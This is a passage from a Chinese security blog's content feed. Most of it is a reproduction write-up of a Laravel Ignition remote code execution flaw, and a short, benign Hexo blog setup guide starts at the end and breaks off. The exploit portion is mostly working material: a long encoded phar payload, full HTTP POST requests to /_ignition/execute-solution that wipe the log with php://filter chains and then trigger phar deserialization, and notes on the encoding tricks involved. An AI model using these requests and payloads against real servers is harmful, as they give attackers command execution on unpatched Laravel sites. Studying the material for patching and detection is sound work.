0&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;59&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4F&#x3D;00&#x3D;6E&#x3D;00&#x3D;74&#x3D;00&#x3D;70&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;41&#x3D;00&#x3D;37&#x3D;00&#x3D;59&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;79&#x3D;00&#x3D;4F&#x3D;00&#x3D;6E&#x3D;00&#x3D;74&#x3D;00&#x3D;70&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;41&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;33&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;4A&#x3D;00&#x3D;77&#x3D;00&#x3D;61&#x3D;00&#x3D;48&#x3D;00&#x3D;42&#x3D;00&#x3D;70&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;76&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;55&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;6D&#x3D;00&#x3D;78&#x3D;00&#x3D;6C&#x3D;00&#x3D;64&#x3D;00&#x3D;6D&#x3D;00&#x3D;56&#x3D;00&#x3D;73&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;4F&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;31&#x3D;00&#x3D;39&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;34&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;4B&#x3D;00&#x3D;67&#x3D;00&#x3D;42&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;62&#x3D;00&#x3D;43&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;54&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;45&#x3D;00&#x3D;30&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;4B&#x3D;00&#x3D;67&#x3D;00&#x3D;42&#x3D;00&#x3D;70&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;6C&#x3D;00&#x3D;30&#x3D;00&#x3D;61&#x3D;00&#x3D;57&#x3D;00&#x3D;46&#x3D;00&#x3D;73&#x3D;00&#x3D;61&#x3D;00&#x3D;58&#x3D;00&#x3D;70&#x3D;00&#x3D;6C&#x3D;00&#x3D;5A&#x3D;00&#x3D;43&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;59&#x3D;00&#x3D;6A&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;51&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;71&#x3D;00&#x3D;41&#x3D;00&#x3D;47&#x3D;00&#x3D;4A&#x3D;00&#x3D;31&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;6B&#x3D;00&#x3D;78&#x3D;00&#x3D;70&#x3D;00&#x3D;62&#x3D;00&#x3D;57&#x3D;00&#x3D;6C&#x3D;00&#x3D;30&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;70&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;30&#x3D;00&#x3D;78&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;71&#x3D;00&#x3D;41&#x3D;00&#x3D;48&#x3D;00&#x3D;42&#x3D;00&#x3D;79&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;4E&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;33&#x3D;00&#x3D;4E&#x3D;00&#x3D;76&#x3D;00&#x3D;63&#x3D;00&#x3D;6E&#x3D;00&#x3D;4D&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;45&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;6A&#x3D;00&#x3D;70&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;77&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4E&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;59&#x3D;00&#x3D;33&#x3D;00&#x3D;56&#x3D;00&#x3D;79&#x3D;00&#x3D;63&#x3D;00&#x3D;6D&#x3D;00&#x3D;56&#x3D;00&#x3D;75&#x3D;00&#x3D;64&#x3D;00&#x3D;43&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;51&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;6D&#x3D;00&#x3D;4E&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;78&#x3D;00&#x3D;66&#x3D;00&#x3D;64&#x3D;00&#x3D;58&#x3D;00&#x3D;4E&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;6C&#x3D;00&#x3D;39&#x3D;00&#x3D;6D&#x3D;00&#x3D;64&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;6A&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;39&#x3D;00&#x3D;66&#x3D;00&#x3D;58&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;71&#x3D;00&#x3D;41&#x3D;00&#x3D;47&#x3D;00&#x3D;4A&#x3D;00&#x3D;31&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;6C&#x3D;00&#x3D;4E&#x3D;00&#x3D;70&#x3D;00&#x3D;65&#x3D;00&#x3D;6D&#x3D;00&#x3D;55&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;6B&#x3D;00&#x3D;36&#x3D;00&#x3D;4C&#x3D;00&#x3D;54&#x3D;00&#x3D;45&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;35&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;4B&#x3D;00&#x3D;67&#x3D;00&#x3D;42&#x3D;00&#x3D;69&#x3D;00&#x3D;64&#x3D;00&#x3D;57&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;49&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;45&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;70&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;77&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;45&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;6A&#x3D;00&#x3D;70&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;77&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4E&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;63&#x3D;00&#x3D;47&#x3D;00&#x3D;68&#x3D;00&#x3D;77&#x3D;00&#x3D;61&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;6D&#x3D;00&#x3D;62&#x3D;00&#x3D;79&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;31&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;4A&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;62&#x3D;00&#x3D;43&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;54&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;39&#x3D;00&#x3D;66&#x3D;00&#x3D;58&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4F&#x3D;00&#x3D;44&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;6F&#x3D;00&#x3D;41&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;56&#x3D;00&#x3D;32&#x3D;00&#x3D;5A&#x3D;00&#x3D;57&#x3D;00&#x3D;77&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;30&#x3D;00&#x3D;34&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4E&#x3D;00&#x3D;44&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;6F&#x3D;00&#x3D;41&#x3D;00&#x3D;61&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;70&#x3D;00&#x3D;64&#x3D;00&#x3D;47&#x3D;00&#x3D;6C&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;6C&#x3D;00&#x3D;36&#x3D;00&#x3D;5A&#x3D;00&#x3D;57&#x3D;00&#x3D;51&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;49&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;45&#x3D;00&#x3D;30&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;4B&#x3D;00&#x3D;67&#x3D;00&#x3D;42&#x3D;00&#x3D;69&#x3D;00&#x3D;64&#x3D;00&#x3D;57&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;4A&#x3D;00&#x3D;4D&#x3D;00&#x3D;61&#x3D;00&#x3D;57&#x3D;00&#x3D;31&#x3D;00&#x3D;70&#x3D;00&#x3D;64&#x3D;00&#x3D;43&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;74&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;45&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;4B&#x3D;00&#x3D;67&#x3D;00&#x3D;42&#x3D;00&#x3D;77&#x3D;00&#x3D;63&#x3D;00&#x3D;6D&#x3D;00&#x3D;39&#x3D;00&#x3D;6A&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;4E&#x3D;00&#x3D;7A&#x3D;00&#x3D;62&#x3D;00&#x3D;33&#x3D;00&#x3D;4A&#x3D;00&#x3D;7A&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;68&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;49&#x3D;00&#x3D;36&#x3D;00&#x3D;65&#x3D;00&#x3D;32&#x3D;00&#x3D;6B&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;44&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;63&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;6D&#x3D;00&#x3D;4E&#x3D;00&#x3D;31&#x3D;00&#x3D;63&#x3D;00&#x3D;6E&#x3D;00&#x3D;4A&#x3D;00&#x3D;6C&#x3D;00&#x3D;62&#x3D;00&#x3D;6E&#x3D;00&#x3D;51&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;6B&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;45&#x3D;00&#x3D;30&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;4A&#x3D;00&#x3D;6A&#x3D;00&#x3D;59&#x3D;00&#x3D;57&#x3D;00&#x3D;78&#x3D;00&#x3D;73&#x3D;00&#x3D;58&#x3D;00&#x3D;33&#x3D;00&#x3D;56&#x3D;00&#x3D;7A&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;4A&#x3D;00&#x3D;66&#x3D;00&#x3D;5A&#x3D;00&#x3D;6E&#x3D;00&#x3D;56&#x3D;00&#x3D;75&#x3D;00&#x3D;59&#x3D;00&#x3D;79&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;66&#x3D;00&#x3D;58&#x3D;00&#x3D;31&#x3D;00&#x3D;39&#x3D;00&#x3D;42&#x3D;00&#x3D;51&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;47&#x3D;00&#x3D;52&#x3D;00&#x3D;31&#x3D;00&#x3D;62&#x3D;00&#x3D;57&#x3D;00&#x3D;31&#x3D;00&#x3D;35&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;4E&#x3D;00&#x3D;4E&#x3D;00&#x3D;51&#x3D;00&#x3D;42&#x3D;00&#x3D;47&#x3D;00&#x3D;41&#x3D;00&#x3D;45&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;44&#x3D;00&#x3D;48&#x3D;00&#x3D;35&#x3D;00&#x3D;2F&#x3D;00&#x3D;32&#x3D;00&#x3D;4C&#x3D;00&#x3D;51&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;48&#x3D;00&#x3D;52&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;33&#x3D;00&#x3D;51&#x3D;00&#x3D;75&#x3D;00&#x3D;64&#x3D;00&#x3D;48&#x3D;00&#x3D;68&#x3D;00&#x3D;30&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;4E&#x3D;00&#x3D;4E&#x3D;00&#x3D;51&#x3D;00&#x3D;42&#x3D;00&#x3D;47&#x3D;00&#x3D;41&#x3D;00&#x3D;45&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;44&#x3D;00&#x3D;48&#x3D;00&#x3D;35&#x3D;00&#x3D;2F&#x3D;00&#x3D;32&#x3D;00&#x3D;4C&#x3D;00&#x3D;51&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;64&#x3D;00&#x3D;47&#x3D;00&#x3D;56&#x3D;00&#x3D;7A&#x3D;00&#x3D;64&#x3D;00&#x3D;48&#x3D;00&#x3D;52&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;33&#x3D;00&#x3D;52&#x3D;00&#x3D;35&#x3D;00&#x3D;64&#x3D;00&#x3D;71&#x3D;00&#x3D;45&#x3D;00&#x3D;47&#x3D;00&#x3D;48&#x3D;00&#x3D;58&#x3D;00&#x3D;52&#x3D;00&#x3D;53&#x3D;00&#x3D;6B&#x3D;00&#x3D;44&#x3D;00&#x3D;33&#x3D;00&#x3D;50&#x3D;00&#x3D;52&#x3D;00&#x3D;6D&#x3D;00&#x3D;33&#x3D;00&#x3D;58&#x3D;00&#x3D;36&#x3D;00&#x3D;2F&#x3D;00&#x3D;68&#x3D;00&#x3D;4E&#x3D;00&#x3D;4E&#x3D;00&#x3D;68&#x3D;00&#x3D;31&#x3D;00&#x3D;4D&#x3D;00&#x3D;58&#x3D;00&#x3D;51&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;42&#x3D;00&#x3D;48&#x3D;00&#x3D;51&#x3D;00&#x3D;6B&#x3D;00&#x3D;31&#x3D;00&#x3D;43&#x3D;00&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="清空干扰字符"><a href="#清空干扰字符" class="headerlink" title="清空干扰字符"></a>清空干扰字符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;_ignition&#x2F;execute-solution HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.136.167:8000</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.136.167:8000&#x2F;_ignition&#x2F;execute-solution</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 291</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">&quot;parameters&quot;:&#123;</span><br><span class="line">&quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">&quot;viewFile&quot;: &quot;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;laravel&#x2F;storage&#x2F;logs&#x2F;laravel.log&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;_ignition&#x2F;execute-solution HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.136.167:8000</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.136.167:8000&#x2F;_ignition&#x2F;execute-solution</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 214</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">&quot;parameters&quot;:&#123;</span><br><span class="line">&quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">&quot;viewFile&quot;: &quot;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;laravel&#x2F;storage&#x2F;logs&#x2F;laravel.log&#x2F;test.txt&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>代码那里就不分析了，比较简单，先 file_get_contents 后 file_put_contents，文件名可控。</p><p>我们从上面可以知道，重要步骤，实际上就是清空 log，写入 payload，最后利用 =00 ，双字节，base64会忽略其他字符等几个过滤器，实现写入phar文件，最后成功命令执行</p><h3 id="清空log"><a href="#清空log" class="headerlink" title="清空log"></a>清空log</h3><p>不要用什么三次 base64-decode，直接使用这个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;laravel&#x2F;storage&#x2F;logs&#x2F;laravel.log</span><br></pre></td></tr></table></figure><p>清除就很干净，报错就多弄两遍</p><h3 id="quoted-printable-encode-1"><a href="#quoted-printable-encode-1" class="headerlink" title="quoted-printable-encode"></a>quoted-printable-encode</h3><p>这一步要注意，base64后的payload不能含有 =，不然之后会一起被 convert.quoted-printable-decode 解码，导致错误，这是一个坑点</p><p>这个的作用主要是给payload中每一个字符后都放一个 \0 ，比如 a\0 ，之后 utf-16 解码就会解码成 a</p><h4 id="utf-16解码"><a href="#utf-16解码" class="headerlink" title="utf-16解码"></a>utf-16解码</h4><p>这个会将2个字节解码成一个，所以我们得payload前面不能是单数，不然会弄乱我们得payload，我们可以通过给payload前面补一个字符得方式去解决</p><p>这个的作用是将不属于 payload 的其他字符转换成非 ascii 字符，之后 base64 解码会自动删除这些 不属于 base64 解码范围内的字符，就可以得到完整的payload</p><h4 id="有两个-payload"><a href="#有两个-payload" class="headerlink" title="有两个 payload"></a>有两个 payload</h4><p>payload会写两次到log中，如果最后存在两次payload，那么也是不能执行得，所以我们需要避免，也可以通过在payload前面或者是payload后面加一个字符得方式来解决</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>exploit-db 提供了，我就不班门弄斧了，实际上 payload 暂时并不通用，随机应变把<br>我改了一下，是在生成 payload 后，在其前面加字符，一般加一个就能看出来行不行了。</p><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><img src="https://gitee.com/N0puple/nopic/raw/master/img/20210121235202109.png"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> laravel </tag>
            
            <tag> php </tag>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>建立博客小记</title>
      <link href="2020/06/01/%E5%BB%BA%E7%AB%8B%E5%8D%9A%E5%AE%A2%E5%B0%8F%E8%AE%B0/"/>
      <url>2020/06/01/%E5%BB%BA%E7%AB%8B%E5%8D%9A%E5%AE%A2%E5%B0%8F%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><p>安装 <code>node.js</code> ，<code>npm</code> ，检查是否成功安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br><span class="line">=&gt; v10.15.3</span><br><span class="line">npm -v</span><br><span class="line">=&gt; 6.4.1</span><br></pre></td></tr></table></figure><p>安装 <code>hexo</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli </span><br></pre></td></tr></table></figure><p>创建 <code>myBlog</code> 文件夹，在文件夹中执行如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init blog</span><br></pre></td></tr></table></figure><p>进入 <code>blog</code> 文件夹，输入命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>这样相当于启动了一个服务器，可以在浏览器中访问 <code>http://localhost:4000</code> ，就可以看到初始的博客界面了。</p><h2 id="连接hexo与github"><a href="#连接hexo与github" class="headerlink" title="连接hexo与github"></a>连接hexo与github</h2><p>在 <code>github</code> 中创建仓库 <code>用户名.github.io</code></p><p>使用 <code>git</code> 配置一些信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;你的GitHub用户名&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;你的GitHub注册邮箱&quot;</span></span><br></pre></td></tr></table></figure><p>生成ssh密钥文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;你的GitHub注册邮箱&quot;</span></span><br></pre></td></tr></table></figure><p>在你的用户文件夹下找到 <code>.ssh</code> 